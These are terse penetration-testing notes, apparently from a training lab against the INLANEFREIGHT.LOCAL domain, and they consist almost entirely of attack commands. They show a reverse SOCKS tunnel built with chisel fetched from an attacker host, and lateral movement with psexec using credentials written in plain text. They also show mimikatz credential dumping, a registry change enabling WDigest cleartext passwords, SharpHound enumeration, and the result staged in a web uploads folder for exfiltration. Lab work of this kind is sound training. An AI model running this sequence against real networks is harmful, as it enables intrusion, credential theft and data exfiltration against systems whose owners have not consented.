# gain an account
svc_sql / lucky7

# serach the next targets
## Web
```zsh
PS> arp -a
```

# create useful connection for shell
## Attack
```zsh
$ python -m http.server 81
```
## Web
```zsh
PS> Invoke-WebRequest -Uri http://10.10.14.69:81/chisel.exe -Outfile "C:\chisel.exe"
```
## Attack
```zsh
$ chisel_1.9.1_linux_amd64 server -p 8001 --reverse
```
## Web
```zsh
PS> c:\chisel.exe client 10.10.14.69:8001 R:5000:socks
```
## Attack
```zsh
$ sudo vim /etc/proxychains4.conf
socks5 	127.0.0.1 5000
```

# try the next target with a gained account
```zsh
$ proxychains4 crackmapexec smb 172.16.6.100 -u "svc_sql" -p "lucky7"
$ proxychains4 psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.100
# failed: [-] share 'ADMIN$' or share 'C$' is not writable.
$ proxychains4 psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50
```

C:\Windows\system32> dir /b | findstr /i mimi


## MS01
net share

## Web
```zsh
PS> Invoke-WebRequest -Uri http://10.10.14.69:81/mimikatz.exe -Outfile "C:\mimikatz.exe"
PS> net use \\172.16.6.50\C$ /user:svc_sql lucky7
PS> copy C:\mimikatz.exe \\172.16.6.50\C$\
```

## MS01
```zsh
> C:\mimikatz.exe
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
> reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest"
# to update
> shutdown /r /t 0 /f
> C:\mimikatz.exe
mimikatz# privilege::debug
mimikatz# sekurlsa::wdigest
```

## Web
```zsh
PS> Invoke-WebRequest -Uri http://10.10.14.69:81/SharpHound.exe -Outfile "C:\SharpHound.exe"
PS> net use \\172.16.6.50\C$ /user:svc_sql lucky7
PS> copy C:\SharpHound.exe \\172.16.6.50\C$\

```zsh
PS> Invoke-WebRequest -Uri http://10.10.14.69:81/PowerView.ps1 -Outfile "C:\PowerView.ps1"
PS> net use \\172.16.6.50\C$ /user:svc_sql lucky7
PS> copy C:\PowerView.ps1 \\172.16.6.50\C$\
```
```

## MS01
```zsh
> C:\SharpHound.exe -c ALL --zipfilename enum
```

## Web
```zsh
PS> copy \\172.16.6.50\C$\20240901013650_enum.zip C:\
PS> copy C:\20240901013650_enum.zip C:\inetpub\wwwroot\uploads\
```